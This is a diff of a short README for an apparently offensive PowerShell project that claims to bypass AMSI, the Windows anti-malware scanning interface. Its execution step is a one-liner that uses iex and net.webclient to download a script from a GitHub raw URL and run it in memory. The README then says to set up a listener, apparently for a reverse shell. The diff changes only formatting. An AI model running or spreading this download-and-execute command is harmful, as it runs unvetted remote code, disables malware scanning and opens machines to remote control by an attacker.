@@ -1,7 +1,7 @@
 # obstest
 This is a powershell script that bypass amsi :)
 
-How to execute ?
+How to execute ? \n
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/AeroWw/obtest/script.ps1')
 
 set up a listerner 
